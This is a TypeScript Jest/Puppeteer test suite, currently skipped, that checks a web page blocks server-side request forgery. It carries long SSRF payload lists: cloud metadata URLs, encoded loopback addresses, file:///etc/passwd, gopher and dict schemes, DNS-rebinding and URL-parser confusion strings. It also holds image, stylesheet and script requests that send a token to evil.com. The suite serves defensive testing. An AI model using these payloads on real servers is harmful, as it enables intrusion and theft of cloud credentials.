import { describe, it, expect, beforeAll, afterAll } from '@jest/globals';
import { Browser, Page } from 'puppeteer';
import { launchBrowser } from '../../helpers/browser-launcher.js';
import { delay } from '../../helpers/delay.js';

describe.skip('SSRF (Server-Side Request Forgery) Prevention Tests', () => {
  let browser: Browser;
  let page: Page;

  beforeAll(async () => {
    browser = await launchBrowser();
    page = await browser.newPage();
  });

  afterAll(async () => {
    if (browser) {
      await browser.close();
    }
  });

  describe('SSRF Attack Prevention', () => {
    it('should prevent requests to internal network addresses', async () => {
      const internalAddresses = [
        'http://127.0.0.1:22',
        'http://127.0.0.1:3306',
        'http://127.0.0.1:5432',
        'http://127.0.0.1:6379',
        'http://127.0.0.1:27017',
        'http://127.0.0.1:9200',
        'http://127.0.0.1:11211',
        'http://localhost:8080',
        'http://localhost:admin',
        'http://[::1]:80',
        'http://[::1]:443',
        'http://169.254.169.254/', // AWS metadata
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/user-data/',
        'http://169.254.169.254/latest/api/token',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/',
        'http://192.168.1.1',
        'http://192.168.0.1',
        'http://10.0.0.1',
        'http://10.10.10.10',
        'http://172.16.0.1',
        'http://172.17.0.1', // Docker default
        'http://[fd00::1]',
        'http://[fe80::1]',
        'http://0.0.0.0',
        'http://0.0.0.0:8080',
        'http://[0:0:0:0:0:0:0:0]',
        'http://[::]',
        'http://[::ffff:127.0.0.1]',
        'http://[::ffff:169.254.169.254]',
        'http://2130706433/', // 127.0.0.1 as decimal
        'http://0x7f000001/', // 127.0.0.1 as hex
        'http://0177.0.0.1/', // 127.0.0.1 as octal
        'http://127.1/',
        'http://127.0.1/',
        'http://localhost.localdomain',
        'http://127.127.127.127/',
        'http://127.0.0.0/',
        'http://2852039166/', // 169.254.169.254 as decimal
        'https://[::ffff:a9fe:a9fe]/', // IPv6 representation of 169.254.169.254
        'http://0251.0376.0251.0376/', // 169.254.169.254 as octal
        'http://0xa9.0xfe.0xa9.0xfe/', // 169.254.169.254 as hex
        'http://instance-data/',
        'http://metadata/',
        'file:///etc/passwd',
        'file://localhost/etc/passwd',
        'gopher://127.0.0.1:70/',
        'dict://127.0.0.1:11211/',
        'ftp://127.0.0.1/',
        'sftp://127.0.0.1/',
        'tftp://127.0.0.1/',
        'ldap://127.0.0.1/',
        'ssh://127.0.0.1/',
      ];

      for (const url of internalAddresses) {
        try {
          const response = await page.goto(url, {
            waitUntil: 'networkidle0',
            timeout: 5000,
          });

          // Should not access internal resources
          if (response) {
            expect(response.status()).not.toBe(200);
            const content = await page.content();
            expect(content).not.toContain('root:x:0:0');
            expect(content).not.toContain('ami-id');
            expect(content).not.toContain('instance-id');
          }
        } catch (error: any) {
          // Should fail or be blocked
          expect(error.message).toMatch(
            /Navigation|ERR_FAILED|ERR_ABORTED|ERR_CONNECTION_REFUSED|ERR_INVALID_URL/,
          );
        }
      }
    });

    it('should prevent DNS rebinding attacks', async () => {
      const dnsRebindingUrls = [
        'http://spoofed.burpcollaborator.net',
        'http://evil.com.127.0.0.1.nip.io',
        'http://127.0.0.1.xip.io',
        'http://169.254.169.254.xip.io',
        'http://2130706433.xip.io',
        'http://7f000001.xip.io',
        'http://localhost.evil.com',
        'http://127.0.0.1.evil.com',
        'http://[::1].evil.com',
        'http://0.evil.com',
        'http://127.1.evil.com',
        'http://127.0.1.evil.com',
        'http://169.254.169.254.evil.com',
        'http://metadata.evil.com',
        'http://localhost.localtest.me',
        'http://customer1.app.localhost.my.company.127.0.0.1.nip.io',
      ];

      for (const url of dnsRebindingUrls) {
        try {
          await page.goto(url, {
            waitUntil: 'domcontentloaded',
            timeout: 3000,
          });

          // Check that we didn't access internal resources
          const content = await page.content();
          expect(content).not.toContain('127.0.0.1');
          expect(content).not.toContain('localhost');
          expect(content).not.toContain('metadata');
        } catch (error: any) {
          // DNS rebinding should be prevented
          expect(error.message).toMatch(/Navigation|ERR_NAME_NOT_RESOLVED|ERR_FAILED|net::ERR/);
        }
      }
    });

    it('should prevent URL parser confusion attacks', async () => {
      const confusionUrls = [
        'http://evil.com@127.0.0.1/',
        'http://127.0.0.1:80@evil.com/',
        'http://evil.com#@127.0.0.1/',
        'http://evil.com?@127.0.0.1/',
        'http://evil.com\\@127.0.0.1/',
        'http://127.0.0.1:80\\@evil.com/',
        'http://127.0.0.1:80;@evil.com/',
        'http://127.0.0.1:80,@evil.com/',
        'http://[::1]@evil.com/',
        'http://[::]@evil.com/',
        'http://0@evil.com/',
        'http://0.0.0.0@evil.com/',
        'http://localhost@evil.com/',
        'http:evil.com@127.0.0.1/',
        'http:/evil.com@127.0.0.1/',
        'http:\\\\127.0.0.1\\',
        'http://127.0.0.1.evil.com',
        'http://127.0.0.1%2eevil.com',
        'http://127.0.0.1%00.evil.com',
        'http://127.0.0.1\\.evil.com',
        'http://127.0.0.1/.evil.com',
        'http://127.0.0.1\tevil.com',
        'http://127.0.0.1\nevil.com',
        'http://127.0.0.1\revil.com',
        'http://google.com:80+&@127.0.0.1:22/',
        'http://127.0.0.1:80#@evil.com/',
        'http://127.0.0.1:80?@evil.com/',
        'http://127.1.1.1&@2130706433:80/',
        'http://stock.adobe.com.127.0.0.1.xip.io/',
        'http://127.0.0.1 @evil.com/',
        'http:@127.0.0.1/',
        'http:/@127.0.0.1/',
        'http://@127.0.0.1/',
        'https:@127.0.0.1/',
        'https:/@127.0.0.1/',
        'https://@127.0.0.1/',
        '//127.0.0.1/',
        '///127.0.0.1/',
        '\\\\127.0.0.1\\',
      ];

      for (const url of confusionUrls) {
        try {
          await page.goto(url, {
            waitUntil: 'domcontentloaded',
            timeout: 3000,
          });

          // Should not bypass to internal addresses
          const actualUrl = await page.url();
          expect(actualUrl).not.toContain('127.0.0.1');
          expect(actualUrl).not.toContain('localhost');
          expect(actualUrl).not.toContain('[::1]');
        } catch (error: any) {
          // Malformed URLs should be rejected
          expect(error.message).toMatch(/Navigation|Invalid URL|ERR_FAILED/);
        }
      }
    });

    it('should prevent redirect-based SSRF', async () => {
      // URLs that might redirect to internal resources
      const redirectUrls = [
        'http://httpbin.org/redirect-to?url=http://127.0.0.1',
        'http://httpbin.org/redirect-to?url=http://169.254.169.254',
        'http://httpbin.org/redirect-to?url=file:///etc/passwd',
        'http://httpbin.org/redirect/3', // Multiple redirects
        'http://bit.ly/ssrf-test', // URL shortener (hypothetical)
        'http://tinyurl.com/ssrf-test', // URL shortener (hypothetical)
      ];

      for (const url of redirectUrls) {
        try {
          // Set up request interception to check redirects
          await page.setRequestInterception(true);

          const requests: string[] = [];
          page.on('request', (request) => {
            requests.push(request.url());
            request.continue();
          });

          await page.goto(url, {
            waitUntil: 'networkidle0',
            timeout: 5000,
          });

          // Check that no internal URLs were accessed
          for (const reqUrl of requests) {
            expect(reqUrl).not.toMatch(/127\.0\.0\.1/);
            expect(reqUrl).not.toMatch(/localhost/);
            expect(reqUrl).not.toMatch(/169\.254\.169\.254/);
            expect(reqUrl).not.toMatch(/file:/);
          }

          await page.setRequestInterception(false);
        } catch (error) {
          // Redirects to internal resources should be blocked
          expect(error).toBeDefined();
        }
      }
    });

    it('should validate fetch and XHR requests', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const ssrfTargets = [
        'http://127.0.0.1:22',
        'http://localhost:3306',
        'http://169.254.169.254/latest/meta-data/',
        'http://metadata.google.internal/',
        'http://192.168.1.1',
        'http://10.0.0.1',
        'file:///etc/passwd',
        'gopher://127.0.0.1:70/',
        'dict://127.0.0.1:11211/',
      ];

      for (const target of ssrfTargets) {
        // Test fetch
        const fetchResult = await page.evaluate(async (url) => {
          try {
            const response = await fetch(url);
            return { success: true, status: response.status };
          } catch (error: any) {
            return { success: false, error: error.message };
          }
        }, target);

        expect(fetchResult.success).toBe(false);
        if (fetchResult.error) {
          expect(fetchResult.error).toMatch(/Failed to fetch|NetworkError|ERR_FAILED/);
        }

        // Test XMLHttpRequest
        const xhrResult = await page.evaluate((url) => {
          return new Promise((resolve) => {
            const xhr = new XMLHttpRequest();
            xhr.open('GET', url, true);
            xhr.onload = () => resolve({ success: true, status: xhr.status });
            xhr.onerror = () => resolve({ success: false, error: 'Network error' });
            try {
              xhr.send();
            } catch (error: any) {
              resolve({ success: false, error: error.message });
            }
          });
        }, target);

        expect(xhrResult.success).toBe(false);
      }
    });

    it('should prevent WebSocket SSRF', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const wsTargets = [
        'ws://127.0.0.1:8080',
        'ws://localhost:9229', // Node.js debugger
        'ws://169.254.169.254/',
        'ws://192.168.1.1/',
        'wss://127.0.0.1:443',
        'ws://[::1]:8080',
        'ws://metadata.google.internal/',
      ];

      for (const target of wsTargets) {
        const wsResult = await page.evaluate((url) => {
          return new Promise((resolve) => {
            try {
              const ws = new WebSocket(url);
              ws.onopen = () => {
                ws.close();
                resolve({ success: true });
              };
              ws.onerror = () => resolve({ success: false, error: 'Connection failed' });
              setTimeout(() => resolve({ success: false, error: 'Timeout' }), 2000);
            } catch (error: any) {
              resolve({ success: false, error: error.message });
            }
          });
        }, target);

        expect(wsResult.success).toBe(false);
      }
    });

    it('should prevent iframe-based SSRF', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const iframeTargets = [
        'http://127.0.0.1',
        'http://localhost:8080',
        'http://169.254.169.254/',
        'file:///etc/passwd',
        'http://192.168.1.1',
      ];

      for (const target of iframeTargets) {
        const iframeResult = await page.evaluate((url) => {
          return new Promise((resolve) => {
            const iframe = document.createElement('iframe');
            iframe.src = url;
            iframe.onload = () => resolve({ loaded: true });
            iframe.onerror = () => resolve({ loaded: false });
            document.body.appendChild(iframe);

            setTimeout(() => {
              document.body.removeChild(iframe);
              resolve({ loaded: false, timeout: true });
            }, 2000);
          });
        }, target);

        expect(iframeResult.loaded).toBe(false);
      }
    });

    it('should prevent data exfiltration via SSRF', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      // Set up request interception to monitor outgoing requests
      await page.setRequestInterception(true);
      const exfiltrationAttempts: string[] = [];

      page.on('request', (request) => {
        const url = request.url();
        if (url.includes('evil.com') || url.includes('attacker.com')) {
          exfiltrationAttempts.push(url);
        }
        request.continue();
      });

      // Attempt various data exfiltration techniques
      await page.evaluate(() => {
        const sensitiveData = 'secret-token-12345';

        // Try to exfiltrate via image
        const img = new Image();
        img.src = `http://evil.com/steal?data=${sensitiveData}`;

        // Try to exfiltrate via CSS
        const link = document.createElement('link');
        link.rel = 'stylesheet';
        link.href = `http://evil.com/css?data=${sensitiveData}`;
        document.head.appendChild(link);

        // Try to exfiltrate via script
        const script = document.createElement('script');
        script.src = `http://evil.com/js?data=${sensitiveData}`;
        document.head.appendChild(script);
      });

      // Wait for any potential requests
      await delay(1000);

      // Check that no data was exfiltrated
      expect(exfiltrationAttempts.length).toBe(0);

      await page.setRequestInterception(false);
    });
  });
});
